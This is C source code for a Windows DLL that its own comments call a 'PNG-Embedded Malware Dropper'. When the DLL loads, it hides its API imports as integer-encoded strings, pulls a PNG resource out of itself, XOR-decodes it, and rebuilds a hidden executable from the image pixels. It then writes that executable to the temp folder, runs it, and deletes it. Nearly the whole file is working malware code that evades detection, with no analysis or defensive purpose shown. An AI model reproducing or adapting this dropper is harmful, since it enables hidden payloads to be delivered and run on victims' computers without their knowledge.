// PNG-Embedded Malware Dropper - Simplified DLL Version
// Drops and executes an Executable Binary from PNG Image Resources

#include<stdio.h>
#include<windows.h>
#include"resource.h"
#include<time.h>
#include<math.h>
#include"lodepng.h"

// Functions prototypes  
void* XOR(void *data, int size);
void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size);
void run(HANDLE hModule);
void launch(void *data, int size);

// Dropper Configurations
#define XOR_ENCODE
#define XOR_KEY 0x35
#define PNG_DECODE

// Dynamic imports structure
typedef HRSRC (WINAPI *MyFindResourceW)(HMODULE,LPCWSTR,LPCWSTR);
typedef HGLOBAL (WINAPI *MyLoadResource)(HMODULE,HRSRC);
typedef LPVOID (WINAPI *MyLockResource)(HGLOBAL);
typedef DWORD (WINAPI *MySizeofResource)(HMODULE,HRSRC);
typedef BOOL (WINAPI *MyCreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);

// Global variables for dynamic imports
HMODULE k32;
MyFindResourceW frw;
MyLoadResource mlr;
MyLockResource mlor;
MySizeofResource sor;
MyCreateProcessA cp;

// Decode strings
char dec[1024];
char* decode(int *encoded, int size)
{
	for(int i=0;i<size;i++)
	{
		dec[i] = char(encoded[i]);
	}
	return dec;
}

// Encoded strings
int k32enc[] = {75,101,114,110,101,108,51,50,46,100,108,108,0};
int findrsrcenc[] ={70,105,110,100,82,101,115,111,117,114,99,101,87,0};
int loadrsrcenc[] ={76,111,97,100,82,101,115,111,117,114,99,101,0};
int lockrsrcenc[] ={76,111,99,107,82,101,115,111,117,114,99,101,0};
int szrsrcenc[] ={83,105,122,101,111,102,82,101,115,111,117,114,99,101,0};
int cprocenc[] ={67,114,101,97,116,101,80,114,111,99,101,115,115,65,0};

/* DLL Entry Point */
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			k32 = LoadLibraryA(decode(k32enc,13));
			frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
			mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
			mlor = (MyLockResource)GetProcAddress(k32,decode(lockrsrcenc,13));
			sor = (MySizeofResource)GetProcAddress(k32,decode(szrsrcenc,15));
			cp = (MyCreateProcessA)GetProcAddress(k32,decode(cprocenc,15));
			run(hModule);
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

// Launch process - simplified version
void launch(void *data, int size)
{
	char tempPath[MAX_PATH];
	char tempFile[MAX_PATH];
	
	// Get temp directory
	GetTempPathA(MAX_PATH, tempPath);
	
	// Create temp filename
	sprintf(tempFile, "%stemp_%d.exe", tempPath, GetTickCount());
	
	// Write payload to temp file
	HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD written;
		WriteFile(hFile, data, size, &written, NULL);
		CloseHandle(hFile);
		
		// Execute the file
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		
		if (cp(NULL, tempFile, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		
		// Clean up temp file after a delay
		Sleep(1000);
		DeleteFileA(tempFile);
	}
}

void* png_to_pe(unsigned char* png_data, size_t png_size, DWORD* pe_size)
{
	unsigned char* image_data;
	unsigned width, height;
	
	// Decode PNG using lodepng
	unsigned error = lodepng_decode_memory(&image_data, &width, &height, png_data, png_size, LCT_GREY, 8);
	
	if (error) {
		*pe_size = 0;
		return NULL;
	}
	
	size_t total_image_size = width * height;
	
	// Allocate buffer for PE data  
	void* pe_data = malloc(total_image_size);
	if (!pe_data) {
		free(image_data);
		*pe_size = 0;
		return NULL;
	}
	
	// Copy image data to PE buffer
	memcpy(pe_data, image_data, total_image_size);
	free(image_data);
	
	// Try to find actual PE size by looking for valid PE structure
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
	if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {
		PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
		if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {
			*pe_size = nt_headers->OptionalHeader.SizeOfImage;
			if (*pe_size > total_image_size) {
				*pe_size = (DWORD)total_image_size;
			}
		} else {
			*pe_size = (DWORD)total_image_size;
		}
	} else {
		*pe_size = (DWORD)total_image_size;
	}
	
	return pe_data;
}

// Main dropper function
void run(HANDLE hModule)
{
	HMODULE h = (HMODULE)hModule;
	HRSRC r = frw(h,MAKEINTRESOURCEW(IDR_PNG1),MAKEINTRESOURCEW(PNG));
	HGLOBAL rc = mlr(h,r);
	void* data = mlor(rc);
	DWORD size = sor(h,r);
	
#ifdef XOR_ENCODE
	data = XOR(data,size);
#endif

#ifdef PNG_DECODE
	DWORD pe_size;
	void* pe_data = png_to_pe((unsigned char*)data, size, &pe_size);
	if (pe_data && pe_size > 0) {
		free(data);
		data = pe_data;
		size = pe_size;
	}
#endif

	launch(data,size);
	free(data);
}

// XOR encoding function
void* XOR(void *data, int size){
	void *buffer = malloc(size);
	for(int i=0;i<size;i++)
	{
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}